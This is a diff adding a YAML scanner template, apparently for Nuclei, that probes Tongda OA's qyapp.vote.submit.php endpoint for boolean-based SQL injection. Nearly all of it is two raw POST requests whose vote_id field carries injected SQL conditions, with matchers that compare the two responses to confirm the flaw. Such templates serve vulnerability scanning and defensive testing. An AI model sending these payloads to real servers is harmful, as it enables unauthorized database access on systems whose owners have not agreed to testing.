@@ -1,0 +1,41 @@
+id: tongda-oa-vote-submit-sqli
+info:
+  name: 通达 oa qyapp.vote.submit.php - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-tongda-vote.submit-SQL.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips: 布尔注入
+    repair:
+    version:
+  tags: 2024,tongda,oa,sqli
+
+http:
+  - raw:
+      - |
+        POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        submitData={"a":{"vote_type":"1","vote_id":"if((select 995=995),1,2*1e308)","value":"1"}}
+      
+      - |+
+        POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        submitData={"a":{"vote_type":"1","vote_id":"if((select 995=9951),1,2*1e308)","value":"1"}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body,'fieldset')
+        condition: and
